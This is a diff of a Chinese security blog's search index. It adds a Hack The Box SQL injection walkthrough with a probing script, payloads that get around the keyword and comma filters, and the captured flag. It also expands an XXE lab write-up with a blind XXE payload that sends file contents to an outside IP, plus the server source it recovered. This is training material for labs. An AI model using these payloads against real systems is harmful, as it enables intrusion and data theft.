@@ -1,18 +1,71 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>面试算法题系列</title>
-    <url>/%E7%AE%97%E6%B3%95/%E9%9D%A2%E8%AF%95%E7%AE%97%E6%B3%95%E9%A2%98%E7%B3%BB%E5%88%97/</url>
-    <content><![CDATA[<p>本文主要描述自己练习的算法题总结，会经常更新。</p>
+    <title>hackthebox_expz</title>
+    <url>/web/hackthebox-expz/</url>
+    <content><![CDATA[<p>本文主要讲解hackthebox上的20分挑战ezpz</p>
 <a id="more"></a>
 
-<h2><span id="字符串">字符串</span></h2><h2><span id="数组">数组</span></h2><p><a href="https://blog.ydq6.com/算法/求数组连续最大和/">求数组连续最大和</a></p>
-<h2><span id="链表">链表</span></h2><h2><span id="队列和栈">队列和栈</span></h2><h2><span id="排序">排序</span></h2><h2><span id="动态规划">动态规划</span></h2>]]></content>
+<p>(1)创建实例</p>
+<p>创建示例，然后进入发现是个网站：</p>
+<p><img src="/assets/image-20200513220512964.png" alt="image-20200513220512964"></p>
+<p>需要参数obj，随便输入obj参数，发现ID属性还是没有。</p>
+<p>（2）扫描</p>
+<p>用dirb扫描网站：</p>
+<p><img src="/assets/image-20200513220834140.png" alt="image-20200513220834140"></p>
+<p>打开所有文件，发现都是一样的。</p>
+<p>（3）漏洞挖掘</p>
+<p>既然只有一个文件，那思路就在这个文件。发现源码中最下面（<font color="red">特别隐蔽的点</font>）有个提示</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Hint : base64_encode($data)--&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后obj有个属性ID,所以添加参数后encode。</p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">obj</span>=&#123;<span class="string">"ID"</span>:<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>encode后：</p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">obj</span>=eyJJRCI6MX0=</span><br></pre></td></tr></table></figure>
+
+<p>成功:</p>
+<p><img src="/assets/image-20200513222409658.png" alt="image-20200513222409658"></p>
+<p>所以可以在ID处看下有注入没有。</p>
+<p>由于手工测试比较麻烦，所以写脚本测试：</p>
+<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import <span class="built_in">base64</span></span><br><span class="line">url=<span class="string">"http://docker.hackthebox.eu:31417/?obj="</span></span><br><span class="line">def send(ID):</span><br><span class="line">	param = '&#123;<span class="string">"ID"</span>:<span class="string">"%s"</span>&#125;'%ID</span><br><span class="line">	param = <span class="built_in">base64</span>.b64encode(param.encode()).decode()</span><br><span class="line">	cur_url = url+param</span><br><span class="line">	<span class="built_in">print</span>(cur_url)</span><br><span class="line">	<span class="built_in">content</span> = requests.<span class="built_in">get</span>(cur_url).<span class="built_in">content</span>.decode('utf-<span class="number">8</span>')</span><br><span class="line">	<span class="keyword">if</span>(len(<span class="built_in">content</span>) != <span class="number">393</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="built_in">content</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"1#"</span>)</span></span>  正确</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"1' and 1#"</span>)</span></span> 正确</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"1' order by 1 #"</span>)</span></span>  <span class="attribute">order</span> 被拦截了</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"1' union select 1 #"</span>)</span></span> 正确</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"1' union select 1,2 #"</span>)</span></span> block了，猜想是block了，</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"1', #"</span>)</span></span> block，确实block了逗号</span><br></pre></td></tr></table></figure>
+
+<p>由于过滤了逗号，所以在网上找过滤逗号思路，找到了一种：</p>
+<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">select</span> * <span class="title">from</span> ((<span class="title">select</span> 1)<span class="title">A</span> <span class="title">join</span> (<span class="title">select</span> 2)<span class="title">B</span> <span class="title">join</span> (<span class="title">select</span> 3)<span class="title">C</span>）;</span></span><br></pre></td></tr></table></figure>
+
+<p>继续注入：</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"1' union select * from ((select 1)A join (select 2)B) #"</span>)</span></span>  成功</span><br><span class="line">测试回显位：</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"-1' union select * from ((select 1)A join (select 2)B) #"</span>)</span></span> 发现显示<span class="number">2</span>，证明第<span class="number">2</span>位为回显位。</span><br><span class="line">接下来测试哪些关键词被过滤了：</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"information_schema.tables"</span>)</span></span> blcok了，经尝试有schema.tables关键词则会报错。</span><br><span class="line">然而数据库和表名都可以加`</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"`schema`.`tables`"</span>)</span></span> 成功，成功绕过。</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"where table_schema=database()"</span>)</span></span>  block了，经测试是where被block了。</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"group_concat(table_name)"</span>)</span></span> group_concat被block了</span><br></pre></td></tr></table></figure>
+
+<p>尝试：</p>
+<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">send("-1' union <span class="keyword">select</span> * <span class="keyword">from</span> ((<span class="keyword">select</span> <span class="number">1</span>)A <span class="keyword">join</span> (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.<span class="symbol">`tables`</span>)B) #<span class="string">")</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>访问:</p>
+<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//docker.hackthebox.eu:31417/?obj=eyJJRCI6Ii0xJyB1bmlvbiBzZWxlY3QgKiBmcm9tICgoc2VsZWN0IDEpQSBqb2luIChzZWxlY3QgdGFibGVfbmFtZSBmcm9tIGBpbmZvcm1hdGlvbl9zY2hlbWFgLmB0YWJsZXNgKUIpICMifQ==</span></span><br></pre></td></tr></table></figure>
+
+<p>得到表：</p>
+<p><img src="/assets/image-20200513234046121.png" alt="image-20200513234046121"></p>
+<p>仔细观察发现可疑表：FlagTableUnguessableEzPZ</p>
+<p>直接select 尝试：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">send("-1' union <span class="keyword">select</span> * <span class="keyword">from</span> ((<span class="keyword">select</span> <span class="number">1</span>)A <span class="keyword">join</span> (<span class="keyword">select</span> * <span class="keyword">from</span> FlagTableUnguessableEzPZ)B) <span class="comment">#")</span></span><br></pre></td></tr></table></figure>
+
+<p>运气好，只有一个字段，显示出flag:</p>
+<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">HTB&#123;T<span class="number">0</span>oE<span class="number">4</span>syP<span class="number">34</span>syL<span class="number">4</span><span class="name">m3</span>SQLiF!<span class="keyword">lt</span><span class="number">3</span>rs&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
       <categories>
-        <category>算法</category>
+        <category>web安全</category>
       </categories>
       <tags>
-        <tag>算法</tag>
+        <tag>hack_the_box</tag>
+        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
@@ -29,8 +82,8 @@
     <title>XXE漏洞实验</title>
     <url>/web/XXE%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C/</url>
     <content><![CDATA[<center><font size="7">XXE漏洞实验</font></center>
+本文主要为XXE漏洞实战。
 
-<p>本文主要为XXE漏洞实战。</p>
 <a id="more"></a>
 
 <h1><span id="靶场实验">靶场实验</span></h1><h2><span id="有回显xxe">有回显XXE</span></h2><p>代码审计看一下js代码（test1.js）。</p>
@@ -67,18 +120,33 @@
 
 <p>得到用户名：heetianlab，密码：test009</p>
 <h2><span id="无回显xxe">无回显XXE</span></h2><p>同样的登录时候抓包，发现没回显了：</p>
-<p><img src="/assets/image-20200511134218161.png" alt="image-20200511134218161"></p>
+<p><img src="/assets/image-20200511134218161-1589375488660.png" alt="image-20200511134218161"></p>
 <p>这时候就要我们的远程服务器进行攻击了.</p>
 <p>evil2.dtd:</p>
-<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read-convert.base64-encode/resource=http://47.105.75.177/vulnlab/xxe/doLogin2.php"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">"&lt;!ENTITY send SYSTEM 'http://104.243.21.153:8998/%file;'&gt;"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%all;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=doLogin2.php"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://104.243.21.153:8998/%file;'&gt;"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%all;</span></span><br></pre></td></tr></table></figure>
 
 
 
 <p>构造请求包：</p>
+<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://104.243.21.153/xxe/evil2.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%dtd;</span></span><br><span class="line"><span class="perl">%int;</span></span><br><span class="line"><span class="perl">%send;</span></span><br><span class="line"><span class="xml">]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20200513210825588.png" alt="image-20200513210825588"></p>
+<p>服务器端得到数据：</p>
+<p><img src="/assets/image-20200513210432175.png" alt="image-20200513210432175"></p>
+<p>即：</p>
+<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">PD<span class="number">9</span>waHAKCgokVVNFUk<span class="number">5</span>BTUUgPSAnaGVldGlhbmxhYic<span class="number">7</span>IC<span class="number">8</span>v<span class="number">6</span>LSm<span class="number">5</span>Y+<span class="number">3</span>CiRQQVNTV<span class="number">09</span>SRCA<span class="number">9</span>ICd<span class="number">0</span>ZXN<span class="number">0</span>MDA<span class="number">5</span>JzsgLy/lr<span class="number">4</span>bnoIEKJHJlc<span class="number">3</span>VsdCA<span class="number">9</span>IG<span class="number">51</span>bGw<span class="number">7</span>CgpsaWJ<span class="number">4</span>bWxfZGlzYWJsZV<span class="number">9</span>lbnRpdHlfbG<span class="number">9</span>hZGVyKGZhbHNlKTsKJHhtbGZpbGUgPSBmaWxlX<span class="number">2</span>dldF<span class="number">9</span>jb<span class="number">250</span>ZW<span class="number">50</span>cygncGhwO<span class="keyword">i8</span>vaW<span class="number">5</span>wdXQnKTsKCnRyeXsKCSRkb<span class="number">20</span>gPSBuZXcgRE<span class="number">9</span>NRG<span class="number">9</span>jdW<span class="number">1</span>lbnQoKTsKCSRkb<span class="number">20</span>tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF<span class="number">9</span>OT<span class="number">0</span>VOVCB<span class="number">8</span>IExJQlhNTF<span class="number">9</span>EVERMT<span class="number">0</span>FEKTsKCSRjcmVkcyA<span class="number">9</span>IHNpbXBsZXhtbF<span class="number">9</span>pbXBvcnRfZG<span class="number">9</span>tKCRkb<span class="number">20</span>pOwoKCSR<span class="number">1</span><span class="keyword">c</span><span class="number">2</span>VybmFtZSA<span class="number">9</span>ICRjcmVkcy<span class="number">0</span>+dXNlcm<span class="number">5</span>hbWU<span class="number">7</span>CgkkcGFzc<span class="number">3</span>dvcmQgPSAkY<span class="number">3</span>JlZHMtPnBhc<span class="number">3</span>N<span class="number">3</span>b<span class="number">3</span>JkOwoKCWlmKCR<span class="number">1</span><span class="keyword">c</span><span class="number">2</span>VybmFtZSA<span class="number">9</span>PSAkVVNFUk<span class="number">5</span>BTUUgJiYgJHBhc<span class="number">3</span>N<span class="number">3</span>b<span class="number">3</span>JkID<span class="number">09</span>ICRQQVNTV<span class="number">09</span>SRCl<span class="number">7</span>CgkJJHJlc<span class="number">3</span>VsdDEgPSBzcHJpbnRmKCI<span class="number">8</span>cmVzdWx<span class="number">0</span>Pjxjb<span class="number">2</span>RlPiVkPC<span class="number">9</span>jb<span class="number">2</span>RlPjxtc<span class="number">2</span><span class="keyword">c</span>+JXM<span class="number">8</span>L<span class="number">21</span>zZz<span class="number">48</span>L<span class="number">3</span>Jlc<span class="number">3</span>VsdD<span class="number">4</span>iLDEsJHVzZXJuYW<span class="number">1</span>lKTsKCQkkcmVzdWx<span class="number">0</span>ID<span class="number">0</span><span class="keyword">gc</span><span class="number">3</span>ByaW<span class="number">50</span>ZigiPHJlc<span class="number">3</span>VsdD<span class="number">48</span>Y<span class="number">29</span>kZT<span class="number">4</span>lZDwvY<span class="number">29</span>kZT<span class="number">48</span>L<span class="number">3</span>Jlc<span class="number">3</span>VsdD<span class="number">4</span>iLDEpOwoJfWVsc<span class="number">2</span>V<span class="number">7</span>CgkJJHJlc<span class="number">3</span>VsdDEgPSBzcHJpbnRmKCI<span class="number">8</span>cmVzdWx<span class="number">0</span>Pjxjb<span class="number">2</span>RlPiVkPC<span class="number">9</span>jb<span class="number">2</span>RlPjxtc<span class="number">2</span><span class="keyword">c</span>+JXM<span class="number">8</span>L<span class="number">21</span>zZz<span class="number">48</span>L<span class="number">3</span>Jlc<span class="number">3</span>VsdD<span class="number">4</span>iLDAsJHVzZXJuYW<span class="number">1</span>lKTsKCQkkcmVzdWx<span class="number">0</span>ID<span class="number">0</span><span class="keyword">gc</span><span class="number">3</span>ByaW<span class="number">50</span>ZigiPHJlc<span class="number">3</span>VsdD<span class="number">48</span>Y<span class="number">29</span>kZT<span class="number">4</span>lZDwvY<span class="number">29</span>kZT<span class="number">48</span>L<span class="number">3</span>Jlc<span class="number">3</span>VsdD<span class="number">4</span>iLDApOwoJfQkKfWNhdGNoKEV<span class="number">4</span>Y<span class="number">2</span>VwdGlvbiAkZSl<span class="number">7</span>CgkkcmVzdWx<span class="number">0</span>MSA<span class="number">9</span>IHNwcmludGYoIjxyZXN<span class="number">1</span>bHQ+PGNvZGU+JWQ<span class="number">8</span>L<span class="number">2</span>NvZGU+PG<span class="number">1</span>zZz<span class="number">4</span>lczwvbXNnPjwvcmVzdWx<span class="number">0</span>PiIsMywkZS<span class="number">0</span>+Z<span class="number">2</span>V<span class="number">0</span>TWVzc<span class="number">2</span>FnZSgpKTsKCSRyZXN<span class="number">1</span>bHQgPSBzcHJpbnRmKCI<span class="number">8</span>cmVzdWx<span class="number">0</span>Pjxjb<span class="number">2</span>RlPiVkPC<span class="number">9</span>jb<span class="number">2</span>RlPjwvcmVzdWx<span class="number">0</span>PiIsMyk<span class="number">7</span>Cn<span class="number">0</span>KCmhlYWRlcignQ<span class="number">29</span>udGVudC<span class="number">1</span>UeXBlOiB<span class="number">0</span>ZXh<span class="number">0</span>L<span class="number">2</span>h<span class="number">0</span>bWw<span class="number">7</span>IGNoYXJzZXQ<span class="number">9</span>dXRmLTgnKTsKZWNobyAkcmVzdWx<span class="number">0</span>Owo/Pg==</span><br></pre></td></tr></table></figure>
+
+<p>注意去掉最前面的斜杠。</p>
+<p>base64解码得到源码：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php">$USERNAME = <span class="string">'heetianlab'</span>; <span class="comment">//è´¦å·</span></span></span><br><span class="line"><span class="php">$PASSWORD = <span class="string">'test009'</span>; <span class="comment">//å¯ç </span></span></span><br><span class="line"><span class="php">$result = <span class="keyword">null</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">libxml_disable_entity_loader(<span class="keyword">false</span>);</span></span><br><span class="line"><span class="php">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="php">	$dom = <span class="keyword">new</span> DOMDocument();</span></span><br><span class="line"><span class="php">	$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span></span><br><span class="line"><span class="php">	$creds = simplexml_import_dom($dom);</span></span><br><span class="line"></span><br><span class="line"><span class="php">	$username = $creds-&gt;username;</span></span><br><span class="line"><span class="php">	$password = $creds-&gt;password;</span></span><br><span class="line"></span><br><span class="line"><span class="php">	<span class="keyword">if</span>($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;</span></span><br><span class="line"><span class="php">		$result1 = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="number">1</span>,$username);</span></span><br><span class="line"><span class="php">		$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;/result&gt;"</span>,<span class="number">1</span>);</span></span><br><span class="line"><span class="php">	&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">		$result1 = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="number">0</span>,$username);</span></span><br><span class="line"><span class="php">		$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;/result&gt;"</span>,<span class="number">0</span>);</span></span><br><span class="line"><span class="php">	&#125;	</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)&#123;</span></span><br><span class="line"><span class="php">	$result1 = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="number">3</span>,$e-&gt;getMessage());</span></span><br><span class="line"><span class="php">	$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;/result&gt;"</span>,<span class="number">3</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">header(<span class="string">'Content-Type: text/html; charset=utf-8'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $result;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><font color="red">注意下面这种方式容易带不出数据</font>：</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://104.243.21.153/xxe/evil2.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;send<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>多次尝试都不能成功，估计禁用了外部实体。</p>
-<p>因为这个实验不会做，所以做了下面个合天的实验。</p>
+
+
 <h1><span id="xml外部实体注入漏洞">XML外部实体注入漏洞</span></h1><h2><span id="实验一-dtd学习">实验一 DTD学习</span></h2><p>（1）内部实体声明：</p>
 <p>内部实体声明语法：</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="meta-string">"实体的值"</span>&gt;</span></span><br></pre></td></tr></table></figure>
@@ -290,9 +358,9 @@
         <category>渗透测试</category>
       </categories>
       <tags>
-        <tag>靶机</tag>
         <tag>web</tag>
         <tag>xxe</tag>
+        <tag>靶机</tag>
       </tags>
   </entry>
   <entry>
@@ -405,8 +473,8 @@
         <category>渗透测试</category>
       </categories>
       <tags>
-        <tag>靶机</tag>
         <tag>web</tag>
+        <tag>靶机</tag>
       </tags>
   </entry>
   <entry>
@@ -508,8 +576,8 @@
         <category>渗透测试</category>
       </categories>
       <tags>
-        <tag>靶机</tag>
         <tag>web</tag>
+        <tag>靶机</tag>
       </tags>
   </entry>
   <entry>
@@ -973,8 +1041,8 @@
         <category>渗透测试</category>
       </categories>
       <tags>
-        <tag>靶机</tag>
         <tag>web</tag>
+        <tag>靶机</tag>
       </tags>
   </entry>
   <entry>
